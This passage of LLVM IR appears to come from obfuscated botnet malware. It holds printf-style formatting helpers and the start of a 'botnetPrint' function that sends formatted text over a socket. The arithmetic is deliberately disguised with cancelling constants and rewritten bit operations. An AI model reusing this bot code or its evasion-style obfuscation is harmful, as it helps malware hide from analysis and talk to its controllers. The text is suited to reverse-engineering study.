  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %84, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %87

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 0, 48
  %78 = add i32 %76, %77
  %79 = sub nsw i32 %76, 48
  %80 = load i32, i32* %7, align 4
  %81 = sub i32 0, %78
  %82 = sub i32 %80, %81
  %83 = add nsw i32 %80, %78
  store i32 %82, i32* %7, align 4
  br label %84

; <label>:84:                                     ; preds = %71
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  br label %59

; <label>:87:                                     ; preds = %69
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  br i1 %91, label %92, label %132

; <label>:92:                                     ; preds = %87
  %93 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %94 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = icmp ule i32 %95, 40
  br i1 %96, label %97, label %106

; <label>:97:                                     ; preds = %92
  %98 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %93, i32 0, i32 3
  %99 = load i8*, i8** %98, align 8
  %100 = getelementptr i8, i8* %99, i32 %95
  %101 = bitcast i8* %100 to i64*
  %102 = add i32 %95, 1971492371
  %103 = add i32 %102, 8
  %104 = sub i32 %103, 1971492371
  %105 = add i32 %95, 8
  store i32 %104, i32* %94, align 8
  br label %111

; <label>:106:                                    ; preds = %92
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %93, i32 0, i32 2
  %108 = load i8*, i8** %107, align 8
  %109 = bitcast i8* %108 to i64*
  %110 = getelementptr i8, i8* %108, i32 8
  store i8* %110, i8** %107, align 8
  br label %111

; <label>:111:                                    ; preds = %106, %97
  %112 = phi i64* [ %101, %97 ], [ %109, %106 ]
  %113 = load i64, i64* %112, align 8
  %114 = inttoptr i64 %113 to i8*
  store i8* %114, i8** %11, align 8
  %115 = load i8**, i8*** %4, align 8
  %116 = load i8*, i8** %11, align 8
  %117 = icmp ne i8* %116, null
  br i1 %117, label %118, label %120

; <label>:118:                                    ; preds = %111
  %119 = load i8*, i8** %11, align 8
  br label %121

; <label>:120:                                    ; preds = %111
  br label %121

; <label>:121:                                    ; preds = %120, %118
  %122 = phi i8* [ %119, %118 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0), %120 ]
  %123 = load i32, i32* %7, align 4
  %124 = load i32, i32* %8, align 4
  %125 = call i32 @prints(i8** %115, i8* %122, i32 %123, i32 %124)
  %126 = load i32, i32* %9, align 4
  %127 = sub i32 0, %126
  %128 = sub i32 0, %125
  %129 = add i32 %127, %128
  %130 = sub i32 0, %129
  %131 = add nsw i32 %126, %125
  store i32 %130, i32* %9, align 4
  br label %330

; <label>:132:                                    ; preds = %87
  %133 = load i8*, i8** %5, align 8
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %137, label %168

; <label>:137:                                    ; preds = %132
  %138 = load i8**, i8*** %4, align 8
  %139 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = icmp ule i32 %141, 40
  br i1 %142, label %143, label %152

; <label>:143:                                    ; preds = %137
  %144 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 3
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr i8, i8* %145, i32 %141
  %147 = bitcast i8* %146 to i32*
  %148 = sub i32 %141, -2010150076
  %149 = add i32 %148, 8
  %150 = add i32 %149, -2010150076
  %151 = add i32 %141, 8
  store i32 %150, i32* %140, align 8
  br label %157

; <label>:152:                                    ; preds = %137
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 2
  %154 = load i8*, i8** %153, align 8
  %155 = bitcast i8* %154 to i32*
  %156 = getelementptr i8, i8* %154, i32 8
  store i8* %156, i8** %153, align 8
  br label %157

; <label>:157:                                    ; preds = %152, %143
  %158 = phi i32* [ %147, %143 ], [ %155, %152 ]
  %159 = load i32, i32* %158, align 4
  %160 = load i32, i32* %7, align 4
  %161 = load i32, i32* %8, align 4
  %162 = call i32 @printi(i8** %138, i32 %159, i32 10, i32 1, i32 %160, i32 %161, i32 97)
  %163 = load i32, i32* %9, align 4
  %164 = add i32 %163, 1344859865
  %165 = add i32 %164, %162
  %166 = sub i32 %165, 1344859865
  %167 = add nsw i32 %163, %162
  store i32 %166, i32* %9, align 4
  br label %330

; <label>:168:                                    ; preds = %132
  %169 = load i8*, i8** %5, align 8
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 120
  br i1 %172, label %173, label %204

; <label>:173:                                    ; preds = %168
  %174 = load i8**, i8*** %4, align 8
  %175 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %176 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 8
  %178 = icmp ule i32 %177, 40
  br i1 %178, label %179, label %188

; <label>:179:                                    ; preds = %173
  %180 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 3
  %181 = load i8*, i8** %180, align 8
  %182 = getelementptr i8, i8* %181, i32 %177
  %183 = bitcast i8* %182 to i32*
  %184 = sub i32 %177, 141776170
  %185 = add i32 %184, 8
  %186 = add i32 %185, 141776170
  %187 = add i32 %177, 8
  store i32 %186, i32* %176, align 8
  br label %193

; <label>:188:                                    ; preds = %173
  %189 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 2
  %190 = load i8*, i8** %189, align 8
  %191 = bitcast i8* %190 to i32*
  %192 = getelementptr i8, i8* %190, i32 8
  store i8* %192, i8** %189, align 8
  br label %193

; <label>:193:                                    ; preds = %188, %179
  %194 = phi i32* [ %183, %179 ], [ %191, %188 ]
  %195 = load i32, i32* %194, align 4
  %196 = load i32, i32* %7, align 4
  %197 = load i32, i32* %8, align 4
  %198 = call i32 @printi(i8** %174, i32 %195, i32 16, i32 0, i32 %196, i32 %197, i32 97)
  %199 = load i32, i32* %9, align 4
  %200 = sub i32 %199, 1325877306
  %201 = add i32 %200, %198
  %202 = add i32 %201, 1325877306
  %203 = add nsw i32 %199, %198
  store i32 %202, i32* %9, align 4
  br label %330

; <label>:204:                                    ; preds = %168
  %205 = load i8*, i8** %5, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 88
  br i1 %208, label %209, label %240

; <label>:209:                                    ; preds = %204
  %210 = load i8**, i8*** %4, align 8
  %211 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %212 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 8
  %214 = icmp ule i32 %213, 40
  br i1 %214, label %215, label %225

; <label>:215:                                    ; preds = %209
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 3
  %217 = load i8*, i8** %216, align 8
  %218 = getelementptr i8, i8* %217, i32 %213
  %219 = bitcast i8* %218 to i32*
  %220 = sub i32 0, %213
  %221 = sub i32 0, 8
  %222 = add i32 %220, %221
  %223 = sub i32 0, %222
  %224 = add i32 %213, 8
  store i32 %223, i32* %212, align 8
  br label %230

; <label>:225:                                    ; preds = %209
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 2
  %227 = load i8*, i8** %226, align 8
  %228 = bitcast i8* %227 to i32*
  %229 = getelementptr i8, i8* %227, i32 8
  store i8* %229, i8** %226, align 8
  br label %230

; <label>:230:                                    ; preds = %225, %215
  %231 = phi i32* [ %219, %215 ], [ %228, %225 ]
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %7, align 4
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @printi(i8** %210, i32 %232, i32 16, i32 0, i32 %233, i32 %234, i32 65)
  %236 = load i32, i32* %9, align 4
  %237 = sub i32 0, %235
  %238 = sub i32 %236, %237
  %239 = add nsw i32 %236, %235
  store i32 %238, i32* %9, align 4
  br label %330

; <label>:240:                                    ; preds = %204
  %241 = load i8*, i8** %5, align 8
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 117
  br i1 %244, label %245, label %276

; <label>:245:                                    ; preds = %240
  %246 = load i8**, i8*** %4, align 8
  %247 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %248 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = icmp ule i32 %249, 40
  br i1 %250, label %251, label %260

; <label>:251:                                    ; preds = %245
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 3
  %253 = load i8*, i8** %252, align 8
  %254 = getelementptr i8, i8* %253, i32 %249
  %255 = bitcast i8* %254 to i32*
  %256 = add i32 %249, 803503085
  %257 = add i32 %256, 8
  %258 = sub i32 %257, 803503085
  %259 = add i32 %249, 8
  store i32 %258, i32* %248, align 8
  br label %265

; <label>:260:                                    ; preds = %245
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 2
  %262 = load i8*, i8** %261, align 8
  %263 = bitcast i8* %262 to i32*
  %264 = getelementptr i8, i8* %262, i32 8
  store i8* %264, i8** %261, align 8
  br label %265

; <label>:265:                                    ; preds = %260, %251
  %266 = phi i32* [ %255, %251 ], [ %263, %260 ]
  %267 = load i32, i32* %266, align 4
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @printi(i8** %246, i32 %267, i32 10, i32 0, i32 %268, i32 %269, i32 97)
  %271 = load i32, i32* %9, align 4
  %272 = add i32 %271, 1326237899
  %273 = add i32 %272, %270
  %274 = sub i32 %273, 1326237899
  %275 = add nsw i32 %271, %270
  store i32 %274, i32* %9, align 4
  br label %330

; <label>:276:                                    ; preds = %240
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  %280 = icmp eq i32 %279, 99
  br i1 %280, label %281, label %317

; <label>:281:                                    ; preds = %276
  %282 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %283 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 8
  %285 = icmp ule i32 %284, 40
  br i1 %285, label %286, label %296

; <label>:286:                                    ; preds = %281
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %282, i32 0, i32 3
  %288 = load i8*, i8** %287, align 8
  %289 = getelementptr i8, i8* %288, i32 %284
  %290 = bitcast i8* %289 to i32*
  %291 = sub i32 0, %284
  %292 = sub i32 0, 8
  %293 = add i32 %291, %292
  %294 = sub i32 0, %293
  %295 = add i32 %284, 8
  store i32 %294, i32* %283, align 8
  br label %301

; <label>:296:                                    ; preds = %281
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %282, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %286
  %302 = phi i32* [ %290, %286 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = trunc i32 %303 to i8
  %305 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %304, i8* %305, align 1
  %306 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %306, align 1
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %309 = load i32, i32* %7, align 4
  %310 = load i32, i32* %8, align 4
  %311 = call i32 @prints(i8** %307, i8* %308, i32 %309, i32 %310)
  %312 = load i32, i32* %9, align 4
  %313 = sub i32 %312, -1593498566
  %314 = add i32 %313, %311
  %315 = add i32 %314, -1593498566
  %316 = add nsw i32 %312, %311
  store i32 %315, i32* %9, align 4
  br label %330

; <label>:317:                                    ; preds = %276
  br label %329

; <label>:318:                                    ; preds = %17
  br label %319

; <label>:319:                                    ; preds = %318, %35
  %320 = load i8**, i8*** %4, align 8
  %321 = load i8*, i8** %5, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  call void @printchar(i8** %320, i32 %323)
  %324 = load i32, i32* %9, align 4
  %325 = add i32 %324, 1357815848
  %326 = add i32 %325, 1
  %327 = sub i32 %326, 1357815848
  %328 = add nsw i32 %324, 1
  store i32 %327, i32* %9, align 4
  br label %329

; <label>:329:                                    ; preds = %319, %317
  br label %330

; <label>:330:                                    ; preds = %329, %301, %265, %230, %193, %157, %121
  %331 = load i8*, i8** %5, align 8
  %332 = getelementptr inbounds i8, i8* %331, i32 1
  store i8* %332, i8** %5, align 8
  br label %12

; <label>:333:                                    ; preds = %29, %12
  %334 = load i8**, i8*** %4, align 8
  %335 = icmp ne i8** %334, null
  br i1 %335, label %336, label %339

; <label>:336:                                    ; preds = %333
  %337 = load i8**, i8*** %4, align 8
  %338 = load i8*, i8** %337, align 8
  store i8 0, i8* %338, align 1
  br label %339

; <label>:339:                                    ; preds = %336, %333
  %340 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %341 = bitcast %struct.__va_list_tag* %340 to i8*
  call void @llvm.va_end(i8* %341)
  %342 = load i32, i32* %9, align 4
  ret i32 %342
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, 1263404751
  %24 = add i32 %23, 1
  %25 = add i32 %24, 1263404751
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 %37, 731761446
  %39 = sub i32 %38, %36
  %40 = add i32 %39, 731761446
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 1115012134, -1
  %47 = or i32 %44, %45
  %48 = or i32 1115012134, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %74, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %79

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 %69, 82711448
  %71 = add i32 %70, 1
  %72 = add i32 %71, 82711448
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %9, align 4
  br label %74

; <label>:74:                                     ; preds = %66
  %75 = load i32, i32* %7, align 4
  %76 = sub i32 0, -1
  %77 = sub i32 %75, %76
  %78 = add nsw i32 %75, -1
  store i32 %77, i32* %7, align 4
  br label %63

; <label>:79:                                     ; preds = %63
  br label %80

; <label>:80:                                     ; preds = %79, %55
  br label %81

; <label>:81:                                     ; preds = %96, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %99

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = sub i32 0, %90
  %92 = sub i32 0, 1
  %93 = add i32 %91, %92
  %94 = sub i32 0, %93
  %95 = add nsw i32 %90, 1
  store i32 %94, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %85
  %97 = load i8*, i8** %6, align 8
  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %6, align 8
  br label %81

; <label>:99:                                     ; preds = %81
  br label %100

; <label>:100:                                    ; preds = %111, %99
  %101 = load i32, i32* %7, align 4
  %102 = icmp sgt i32 %101, 0
  br i1 %102, label %103, label %118

; <label>:103:                                    ; preds = %100
  %104 = load i8**, i8*** %5, align 8
  %105 = load i32, i32* %10, align 4
  call void @printchar(i8** %104, i32 %105)
  %106 = load i32, i32* %9, align 4
  %107 = add i32 %106, -898586363
  %108 = add i32 %107, 1
  %109 = sub i32 %108, -898586363
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %9, align 4
  br label %111

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* %7, align 4
  %113 = sub i32 0, %112
  %114 = sub i32 0, -1
  %115 = add i32 %113, %114
  %116 = sub i32 0, %115
  %117 = add nsw i32 %112, -1
  store i32 %116, i32* %7, align 4
  br label %100

; <label>:118:                                    ; preds = %100
  %119 = load i32, i32* %9, align 4
  ret i32 %119
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %132

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %76, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %88

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %76

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 0, 48
  %64 = add i32 %62, %63
  %65 = sub nsw i32 %62, 48
  %66 = sub i32 %64, 1475636931
  %67 = sub i32 %66, 10
  %68 = add i32 %67, 1475636931
  %69 = sub nsw i32 %64, 10
  %70 = load i32, i32* %18, align 4
  %71 = sub i32 0, %70
  %72 = sub i32 0, %68
  %73 = add i32 %71, %72
  %74 = sub i32 0, %73
  %75 = add nsw i32 %70, %68
  store i32 %74, i32* %18, align 4
  br label %76

; <label>:76:                                     ; preds = %61, %55
  %77 = load i32, i32* %18, align 4
  %78 = sub i32 %77, -1284459972
  %79 = add i32 %78, 48
  %80 = add i32 %79, -1284459972
  %81 = add nsw i32 %77, 48
  %82 = trunc i32 %80 to i8
  %83 = load i8*, i8** %17, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 -1
  store i8* %84, i8** %17, align 8
  store i8 %82, i8* %84, align 1
  %85 = load i32, i32* %11, align 4
  %86 = load i32, i32* %21, align 4
  %87 = udiv i32 %86, %85
  store i32 %87, i32* %21, align 4
  br label %52

; <label>:88:                                     ; preds = %52
  %89 = load i32, i32* %19, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %122

; <label>:91:                                     ; preds = %88
  %92 = load i32, i32* %13, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %118

; <label>:94:                                     ; preds = %91
  %95 = load i32, i32* %14, align 4
  %96 = xor i32 %95, -1
  %97 = xor i32 2, -1
  %98 = xor i32 2001511098, -1
  %99 = or i32 %96, %97
  %100 = or i32 2001511098, %98
  %101 = xor i32 %99, -1
  %102 = and i32 %101, %100
  %103 = and i32 %95, 2
  %104 = icmp ne i32 %102, 0
  br i1 %104, label %105, label %118

; <label>:105:                                    ; preds = %94
  %106 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %106, i32 45)
  %107 = load i32, i32* %20, align 4
  %108 = sub i32 0, %107
  %109 = sub i32 0, 1
  %110 = add i32 %108, %109
  %111 = sub i32 0, %110
  %112 = add nsw i32 %107, 1
  store i32 %111, i32* %20, align 4
  %113 = load i32, i32* %13, align 4
  %114 = add i32 %113, 930531160
  %115 = add i32 %114, -1
  %116 = sub i32 %115, 930531160
  %117 = add nsw i32 %113, -1
  store i32 %116, i32* %13, align 4
  br label %121

; <label>:118:                                    ; preds = %94, %91
  %119 = load i8*, i8** %17, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 -1
  store i8* %120, i8** %17, align 8
  store i8 45, i8* %120, align 1
  br label %121

; <label>:121:                                    ; preds = %118, %105
  br label %122

; <label>:122:                                    ; preds = %121, %88
  %123 = load i32, i32* %20, align 4
  %124 = load i8**, i8*** %9, align 8
  %125 = load i8*, i8** %17, align 8
  %126 = load i32, i32* %13, align 4
  %127 = load i32, i32* %14, align 4
  %128 = call i32 @prints(i8** %124, i8* %125, i32 %126, i32 %127)
  %129 = sub i32 0, %128
  %130 = sub i32 %123, %129
  %131 = add nsw i32 %123, %128
  store i32 %130, i32* %8, align 4
  br label %132

; <label>:132:                                    ; preds = %122, %25
  %133 = load i32, i32* %8, align 4
  ret i32 %133
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #3
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #9
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #3
